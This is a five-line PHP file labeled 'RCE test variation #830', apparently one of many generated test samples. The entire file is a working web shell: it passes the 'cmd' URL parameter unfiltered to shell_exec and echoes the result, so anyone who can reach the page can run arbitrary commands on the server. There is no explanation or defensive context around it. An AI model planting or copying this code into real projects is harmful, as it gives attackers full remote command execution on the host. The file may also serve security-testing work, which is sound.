<?php
// RCE test variation #830
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>